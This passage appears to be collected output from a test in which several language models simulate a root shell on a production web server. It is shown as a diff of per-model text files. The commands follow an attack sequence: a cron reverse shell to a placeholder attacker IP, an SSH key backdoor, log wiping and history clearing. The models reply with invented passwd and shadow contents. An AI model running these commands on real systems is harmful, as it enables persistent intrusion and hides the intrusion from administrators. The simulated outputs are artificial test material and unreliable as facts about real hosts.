+root@prod-web-nyc-01:~#
+
+
+--- END OF: 2-deepseek.txt ---
+
+
+========================================
+--- START OF: 2-gemini.txt ---
+========================================
+
+2-gemini.txt
+Command: whoami
+Response Time: 1.46 seconds
+
+Response:
+root
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 2-gemini.txt ---
+
+
+========================================
+--- START OF: 2-gpt.txt ---
+========================================
+
+2-gpt.txt
+Command: whoami
+Response Time: 6.45 seconds
+
+Response:
+root
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 2-gpt.txt ---
+
+
+========================================
+--- START OF: 2-llama.txt ---
+========================================
+
+2-llama.txt
+Command: whoami
+Response Time: 0.97 seconds
+
+Response:
+root
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 2-llama.txt ---
+
+
+========================================
+--- START OF: 2-sonnet.txt ---
+========================================
+
+2-sonnet.txt
+Command: whoami
+Response Time: 3.46 seconds
+
+Response:
+root
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 2-sonnet.txt ---
+
+
+========================================
+--- START OF: 20-deepseek.txt ---
+========================================
+
+20-deepseek.txt
+Command: crontab -l
+Response Time: 56.67 seconds
+
+Response:
+no crontab for root
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 20-deepseek.txt ---
+
+
+========================================
+--- START OF: 20-gemini.txt ---
+========================================
+
+20-gemini.txt
+Command: crontab -l
+Response Time: 1.98 seconds
+
+Response:
+# m h  dom mon dow   command
+0 2 * * * /usr/bin/certbot renew --quiet
+15 3 * * * /opt/scripts/backup.sh > /var/log/backup.log 2>&1
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 20-gemini.txt ---
+
+
+========================================
+--- START OF: 20-gpt.txt ---
+========================================
+
+20-gpt.txt
+Command: crontab -l
+Response Time: 14.47 seconds
+
+Response:
+no crontab for root
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 20-gpt.txt ---
+
+
+========================================
+--- START OF: 20-llama.txt ---
+========================================
+
+20-llama.txt
+Command: crontab -l
+Response Time: 1.22 seconds
+
+Response:
+no crontab for root
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 20-llama.txt ---
+
+
+========================================
+--- START OF: 20-sonnet.txt ---
+========================================
+
+20-sonnet.txt
+Command: crontab -l
+Response Time: 7.53 seconds
+
+Response:
+# Edit this file to introduce tasks to be run by cron.
+# 
+# m h  dom mon dow   command
+0 2 * * * /usr/local/bin/backup-db.sh >> /var/log/backup.log 2>&1
+15 3 * * 0 /usr/bin/certbot renew --quiet
+0 * * * * /usr/local/bin/cleanup-temp.sh
+*/5 * * * * /usr/local/bin/health-check.sh
+30 1 * * * find /var/log/nginx -name "*.log" -mtime +30 -delete
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 20-sonnet.txt ---
+
+
+========================================
+--- START OF: 21-deepseek.txt ---
+========================================
+
+21-deepseek.txt
+Command: echo '0 * * * * /bin/bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"' | crontab -
+Response Time: 25.69 seconds
+
+Response:
+root@prod-web-nyc-01:~# echo '0 * * * * /bin/bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"' | crontab -
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 21-deepseek.txt ---
+
+
+========================================
+--- START OF: 21-gemini.txt ---
+========================================
+
+21-gemini.txt
+Command: echo '0 * * * * /bin/bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"' | crontab -
+Response Time: 3.00 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 21-gemini.txt ---
+
+
+========================================
+--- START OF: 21-gpt.txt ---
+========================================
+
+21-gpt.txt
+Command: echo '0 * * * * /bin/bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"' | crontab -
+Response Time: 23.78 seconds
+
+Response:
+bash: crontab: command not found
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 21-gpt.txt ---
+
+
+========================================
+--- START OF: 21-llama.txt ---
+========================================
+
+21-llama.txt
+Command: echo '0 * * * * /bin/bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"' | crontab -
+Response Time: 1.17 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 21-llama.txt ---
+
+
+========================================
+--- START OF: 21-sonnet.txt ---
+========================================
+
+21-sonnet.txt
+Command: echo '0 * * * * /bin/bash -c "bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1"' | crontab -
+Response Time: 7.48 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 21-sonnet.txt ---
+
+
+========================================
+--- START OF: 22-deepseek.txt ---
+========================================
+
+22-deepseek.txt
+Command: echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+Response Time: 43.32 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 22-deepseek.txt ---
+
+
+========================================
+--- START OF: 22-gemini.txt ---
+========================================
+
+22-gemini.txt
+Command: echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+Response Time: 8.64 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 22-gemini.txt ---
+
+
+========================================
+--- START OF: 22-gpt.txt ---
+========================================
+
+22-gpt.txt
+Command: echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+Response Time: 12.69 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 22-gpt.txt ---
+
+
+========================================
+--- START OF: 22-llama.txt ---
+========================================
+
+22-llama.txt
+Command: echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+Response Time: 0.98 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 22-llama.txt ---
+
+
+========================================
+--- START OF: 22-sonnet.txt ---
+========================================
+
+22-sonnet.txt
+Command: echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+Response Time: 4.12 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 22-sonnet.txt ---
+
+
+========================================
+--- START OF: 23-deepseek.txt ---
+========================================
+
+23-deepseek.txt
+Command: ssh user@<internal-ip>
+Response Time: 75.78 seconds
+
+Response:
+Last login: Thu Jan  5 12:34:56 2023 from 192.168.1.10
+user@<internal-ip>:~$
+
+
+--- END OF: 23-deepseek.txt ---
+
+
+========================================
+--- START OF: 23-gemini.txt ---
+========================================
+
+23-gemini.txt
+Command: ssh user@<internal-ip>
+Response Time: 12.86 seconds
+
+Response:
+The authenticity of host '10.10.1.5 (10.10.1.5)' can't be established.
+ECDSA key fingerprint is SHA256:AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcde.
+Are you sure you want to continue connecting (yes/no/[fingerprint])?
+
+
+--- END OF: 23-gemini.txt ---
+
+
+========================================
+--- START OF: 23-gpt.txt ---
+========================================
+
+23-gpt.txt
+Command: ssh user@<internal-ip>
+Response Time: 30.50 seconds
+
+Response:
+bash: syntax error near unexpected token `>'
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 23-gpt.txt ---
+
+
+========================================
+--- START OF: 23-llama.txt ---
+========================================
+
+23-llama.txt
+Command: ssh user@<internal-ip>
+Response Time: 1.72 seconds
+
+Response:
+ssh: connect to host <internal-ip> port 22: Invalid argument
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 23-llama.txt ---
+
+
+========================================
+--- START OF: 23-sonnet.txt ---
+========================================
+
+23-sonnet.txt
+Command: ssh user@<internal-ip>
+Response Time: 5.02 seconds
+
+Response:
+ssh: Could not resolve hostname <internal-ip>: Name or service not known
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 23-sonnet.txt ---
+
+
+========================================
+--- START OF: 24-deepseek.txt ---
+========================================
+
+24-deepseek.txt
+Command: history -c
+Response Time: 26.23 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 24-deepseek.txt ---
+
+
+========================================
+--- START OF: 24-gemini.txt ---
+========================================
+
+24-gemini.txt
+Command: history -c
+Response Time: 3.56 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 24-gemini.txt ---
+
+
+========================================
+--- START OF: 24-gpt.txt ---
+========================================
+
+24-gpt.txt
+Command: history -c
+Response Time: 5.28 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 24-gpt.txt ---
+
+
+========================================
+--- START OF: 24-llama.txt ---
+========================================
+
+24-llama.txt
+Command: history -c
+Response Time: 0.98 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 24-llama.txt ---
+
+
+========================================
+--- START OF: 24-sonnet.txt ---
+========================================
+
+24-sonnet.txt
+Command: history -c
+Response Time: 2.99 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 24-sonnet.txt ---
+
+
+========================================
+--- START OF: 25-deepseek.txt ---
+========================================
+
+25-deepseek.txt
+Command: unset HISTFILE
+Response Time: 15.03 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 25-deepseek.txt ---
+
+
+========================================
+--- START OF: 25-gemini.txt ---
+========================================
+
+25-gemini.txt
+Command: unset HISTFILE
+Response Time: 3.23 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 25-gemini.txt ---
+
+
+========================================
+--- START OF: 25-gpt.txt ---
+========================================
+
+25-gpt.txt
+Command: unset HISTFILE
+Response Time: 5.31 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 25-gpt.txt ---
+
+
+========================================
+--- START OF: 25-llama.txt ---
+========================================
+
+25-llama.txt
+Command: unset HISTFILE
+Response Time: 0.94 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 25-llama.txt ---
+
+
+========================================
+--- START OF: 25-sonnet.txt ---
+========================================
+
+25-sonnet.txt
+Command: unset HISTFILE
+Response Time: 3.68 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 25-sonnet.txt ---
+
+
+========================================
+--- START OF: 26-deepseek.txt ---
+========================================
+
+26-deepseek.txt
+Command: rm -f /var/log/auth.log
+Response Time: 21.61 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 26-deepseek.txt ---
+
+
+========================================
+--- START OF: 26-gemini.txt ---
+========================================
+
+26-gemini.txt
+Command: rm -f /var/log/auth.log
+Response Time: 4.73 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 26-gemini.txt ---
+
+
+========================================
+--- START OF: 26-gpt.txt ---
+========================================
+
+26-gpt.txt
+Command: rm -f /var/log/auth.log
+Response Time: 5.89 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 26-gpt.txt ---
+
+
+========================================
+--- START OF: 26-llama.txt ---
+========================================
+
+26-llama.txt
+Command: rm -f /var/log/auth.log
+Response Time: 0.94 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 26-llama.txt ---
+
+
+========================================
+--- START OF: 26-sonnet.txt ---
+========================================
+
+26-sonnet.txt
+Command: rm -f /var/log/auth.log
+Response Time: 4.76 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 26-sonnet.txt ---
+
+
+========================================
+--- START OF: 27-deepseek.txt ---
+========================================
+
+27-deepseek.txt
+Command: cat /dev/null > /var/log/wtmp
+Response Time: 36.37 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 27-deepseek.txt ---
+
+
+========================================
+--- START OF: 27-gemini.txt ---
+========================================
+
+27-gemini.txt
+Command: cat /dev/null > /var/log/wtmp
+Response Time: 4.28 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 27-gemini.txt ---
+
+
+========================================
+--- START OF: 27-gpt.txt ---
+========================================
+
+27-gpt.txt
+Command: cat /dev/null > /var/log/wtmp
+Response Time: 7.59 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 27-gpt.txt ---
+
+
+========================================
+--- START OF: 27-llama.txt ---
+========================================
+
+27-llama.txt
+Command: cat /dev/null > /var/log/wtmp
+Response Time: 0.95 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 27-llama.txt ---
+
+
+========================================
+--- START OF: 27-sonnet.txt ---
+========================================
+
+27-sonnet.txt
+Command: cat /dev/null > /var/log/wtmp
+Response Time: 5.20 seconds
+
+Response:
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 27-sonnet.txt ---
+
+
+========================================
+--- START OF: 3-deepseek.txt ---
+========================================
+
+3-deepseek.txt
+Command: id
+Response Time: 9.65 seconds
+
+Response:
+uid=0(root) gid=0(root) groups=0(root)
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 3-deepseek.txt ---
+
+
+========================================
+--- START OF: 3-gemini.txt ---
+========================================
+
+3-gemini.txt
+Command: id
+Response Time: 4.39 seconds
+
+Response:
+uid=0(root) gid=0(root) groups=0(root)
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 3-gemini.txt ---
+
+
+========================================
+--- START OF: 3-gpt.txt ---
+========================================
+
+3-gpt.txt
+Command: id
+Response Time: 5.90 seconds
+
+Response:
+uid=0(root) gid=0(root) groups=0(root)
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 3-gpt.txt ---
+
+
+========================================
+--- START OF: 3-llama.txt ---
+========================================
+
+3-llama.txt
+Command: id
+Response Time: 1.63 seconds
+
+Response:
+uid=0(root) gid=0(root) groups=0(root)
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 3-llama.txt ---
+
+
+========================================
+--- START OF: 3-sonnet.txt ---
+========================================
+
+3-sonnet.txt
+Command: id
+Response Time: 3.85 seconds
+
+Response:
+uid=0(root) gid=0(root) groups=0(root)
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 3-sonnet.txt ---
+
+
+========================================
+--- START OF: 4-deepseek.txt ---
+========================================
+
+4-deepseek.txt
+Command: cat /etc/passwd
+Response Time: 58.84 seconds
+
+Response:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 4-deepseek.txt ---
+
+
+========================================
+--- START OF: 4-gemini.txt ---
+========================================
+
+4-gemini.txt
+Command: cat /etc/passwd
+Response Time: 18.69 seconds
+
+Response:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:107::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 4-gemini.txt ---
+
+
+========================================
+--- START OF: 4-gpt.txt ---
+========================================
+
+4-gpt.txt
+Command: cat /etc/passwd
+Response Time: 26.23 seconds
+
+Response:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:101:systemd Network Management:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:102:systemd Resolver:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:103:systemd Time Synchronization:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+syslog:x:104:106::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:110:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:111::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:111:118:RealtimeKit,,,:/proc:/usr/sbin/nologin
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 4-gpt.txt ---
+
+
+========================================
+--- START OF: 4-llama.txt ---
+========================================
+
+4-llama.txt
+Command: cat /etc/passwd
+Response Time: 31.05 seconds
+
+Response:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 4-llama.txt ---
+
+
+========================================
+--- START OF: 4-sonnet.txt ---
+========================================
+
+4-sonnet.txt
+Command: cat /etc/passwd
+Response Time: 10.18 seconds
+
+Response:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+syslog:x:104:111::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 4-sonnet.txt ---
+
+
+========================================
+--- START OF: 5-deepseek.txt ---
+========================================
+
+5-deepseek.txt
+Command: cat /etc/shadow
+Response Time: 46.99 seconds
+
+Response:
+root:$6$rounds=5000$somesalt$somehash:18000:0:99999:7:::
+daemon:*:18000:0:99999:7:::
+bin:*:18000:0:99999:7:::
+sys:*:18000:0:99999:7:::
+sync:*:18000:0:99999:7:::
+games:*:18000:0:99999:7:::
+man:*:18000:0:99999:7:::
+lp:*:18000:0:99999:7:::
+mail:*:18000:0:99999:7:::
+news:*:18000:0:99999:7:::
+uucp:*:18000:0:99999:7:::
+proxy:*:18000:0:99999:7:::
+www-data:*:18000:0:99999:7:::
+backup:*:18000:0:99999:7:::
+list:*:18000:0:99999:7:::
+irc:*:18000:0:99999:7:::
+gnats:*:18000:0:99999:7:::
+nobody:*:18000:0:99999:7:::
+systemd-network:*:18000:0:99999:7:::
+systemd-resolve:*:18000:0:99999:7:::
+messagebus:*:18000:0:99999:7:::
+syslog:*:18000:0:99999:7:::
+_apt:*:18000:0:99999:7:::
+uuidd:*:18000:0:99999:7:::
+sshd:*:18000:0:99999:7:::
+pollinate:*:18000:0:99999:7:::
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 5-deepseek.txt ---
+
+
+========================================
+--- START OF: 5-gemini.txt ---
+========================================
+
+5-gemini.txt
+Command: cat /etc/shadow
+Response Time: 15.32 seconds
+
+Response:
+root:$6$a1b2c3d4$eFGhIJkLmnoPqRsTuVwXyZABCDEF.........../GHIjklmnopqrSTUVW.xyz012345:19355:0:99999:7:::
+daemon:*:19213:0:99999:7:::
+bin:*:19213:0:99999:7:::
+sys:*:19213:0:99999:7:::
+sync:*:19213:0:99999:7:::
+games:*:19213:0:99999:7:::
+man:*:19213:0:99999:7:::
+lp:*:19213:0:99999:7:::
+mail:*:19213:0:99999:7:::
+news:*:19213:0:99999:7:::
+uucp:*:19213:0:99999:7:::
+proxy:*:19213:0:99999:7:::
+www-data:*:19213:0:99999:7:::
+backup:*:19213:0:99999:7:::
+list:*:19213:0:99999:7:::
+irc:*:19213:0:99999:7:::
+gnats:*:19213:0:99999:7:::
+nobody:*:19213:0:99999:7:::
+systemd-network:*:19213:0:99999:7:::
+systemd-resolve:*:19213:0:99999:7:::
+systemd-timesync:*:19213:0:99999:7:::
+messagebus:*:19213:0:99999:7:::
+syslog:*:19213:0:99999:7:::
+_apt:*:19213:0:99999:7:::
+sshd:*:19421:0:99999:7:::
+deploy:$6$xYz789aB$cDEfGhIJKlMnOpQrStUvWxYzAbcDeFgHi......./JkLmnoPQRSTUVw.xyz67890123:19422:0:99999:7:::
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 5-gemini.txt ---
+
+
+========================================
+--- START OF: 5-gpt.txt ---
+========================================
+
+5-gpt.txt
+Command: cat /etc/shadow
+Response Time: 37.45 seconds
+
+Response:
+root:!:19306:0:99999:7:::
+daemon:*:19306:0:99999:7:::
+bin:*:19306:0:99999:7:::
+sys:*:19306:0:99999:7:::
+sync:*:19306:0:99999:7:::
+games:*:19306:0:99999:7:::
+man:*:19306:0:99999:7:::
+lp:*:19306:0:99999:7:::
+mail:*:19306:0:99999:7:::
+news:*:19306:0:99999:7:::
+uucp:*:19306:0:99999:7:::
+proxy:*:19306:0:99999:7:::
+www-data:*:19306:0:99999:7:::
+backup:*:19306:0:99999:7:::
+list:*:19306:0:99999:7:::
+irc:*:19306:0:99999:7:::
+gnats:*:19306:0:99999:7:::
+nobody:*:19306:0:99999:7:::
+systemd-network:*:19306:0:99999:7:::
+systemd-resolve:*:19306:0:99999:7:::
+systemd-timesync:*:19306:0:99999:7:::
+syslog:*:19306:0:99999:7:::
+messagebus:*:19306:0:99999:7:::
+_apt:*:19306:0:99999:7:::
+tss:*:19306:0:99999:7:::
+uuidd:*:19306:0:99999:7:::
+tcpdump:*:19306:0:99999:7:::
+sshd:*:19306:0:99999:7:::
+pollinate:*:19306:0:99999:7:::
+lxd:*:19306:0:99999:7:::
+dnsmasq:*:19306:0:99999:7:::
+ubuntu:!:19780:0:99999:7:::
+deploy:$y$j9T$7qkUMC0Vy1yDAsYlqvYbH.$V0s8cT5wzH2r3mO0c9W3mIrV7qgI1G6pO1d1jQv6xG6:19780:0:99999:7:::
+
+
+--- END OF: 5-gpt.txt ---
+
+
+========================================
+--- START OF: 5-llama.txt ---
+========================================
+
+5-llama.txt
+Command: cat /etc/shadow
+Response Time: 18.67 seconds
+
+Response:
+root:$6$yuWaFzXQ$pT7...obfuscated...:19457:0:99999:7:::
+daemon:*:19457:0:99999:7:::
+bin:*:19457:0:99999:7:::
+sys:*:19457:0:99999:7:::
